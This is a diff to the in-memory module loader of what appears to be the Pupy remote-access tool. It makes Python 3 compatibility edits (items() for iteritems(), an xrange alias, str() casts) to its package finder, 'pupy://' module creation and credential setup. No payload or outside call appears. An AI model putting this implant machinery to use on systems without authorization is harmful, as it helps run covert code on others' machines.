@@ -33,6 +33,7 @@ from __future__ import absolute_import
 from __future__ import division
 from __future__ import print_function
 from __future__ import unicode_literals
+
 __all__ = (
     'EXTS_SOURCES', 'EXTS_COMPILED', 'EXTS_NATIVE', 'EXTS_ALL',
     'Blackhole', 'DummyPackageLoader', 'PupyPackageLoader',
@@ -69,6 +70,9 @@ os_ = None
 for module in ('nt', 'posix'):
     if module in sys.builtin_module_names:
         os_ = __import__(module)
+
+if sys.version_info.major > 2:
+    xrange = range
 
 
 def _stub(*args, **kwargs):
@@ -360,7 +364,7 @@ def get_module_files(fullname):
     path = fullname.replace('.', '/')
 
     files = [
-        module for module in modules.iterkeys() \
+        module for module in modules \
         if module.rsplit('.', 1)[0] == path or any([
             (
                 path + '/__init__' + ext == module
@@ -375,14 +379,18 @@ def make_module(fullname, path=None, is_pkg=False, mod=None):
     if mod is None:
         mod = imp.new_module(fullname)
 
-    mod.__name__ = fullname
-    mod.__file__ = 'pupy://{}'.format(path or fullname + '.py')
+    mod.__name__ = str(fullname)
+    mod.__file__ = str(
+        'pupy://{}'.format(path or fullname + '.py')
+    )
 
     if is_pkg:
-        mod.__path__ = [mod.__file__.rsplit('/',1)[0]]
-        mod.__package__ = fullname
+        mod.__path__ = [
+            str(mod.__file__.rsplit('/',1)[0])
+        ]
+        mod.__package__ = str(fullname)
     else:
-        mod.__package__ = fullname.rsplit('.', 1)[0]
+        mod.__package__ = str(fullname.rsplit('.', 1)[0])
 
     sys.modules[fullname] = mod
     return mod
@@ -420,7 +428,7 @@ class PupyPackageLoader(object):
         self.archive = ''
 
     def _rename_aliased(self, fullname):
-        for alias, aliased in aliases.iteritems():
+        for alias, aliased in aliases.items():
             if not fullname.startswith(alias):
                 continue
 
@@ -522,7 +530,7 @@ class PupyPackageFinder(object):
         PupyPackageFinder.search_lock = Lock()
 
     def _rename_aliased(self, fullname):
-        for alias, aliased in aliases.iteritems():
+        for alias, aliased in aliases.items():
             if not fullname.startswith(alias):
                 continue
 
@@ -593,7 +601,7 @@ class PupyPackageFinder(object):
         spath = self.path+'/'
         lpath = len(spath)
 
-        for module in modules.keys():
+        for module in list(modules):
             if not module.startswith(spath):
                 continue
 
@@ -808,7 +816,7 @@ def setup_credentials(config):
         return
 
     credentials = make_module('pupy_credentials')
-    for cred, value in config.pop('credentials').iteritems():
+    for cred, value in config.pop('credentials').items():
         setattr(credentials, cred, value)
 
 
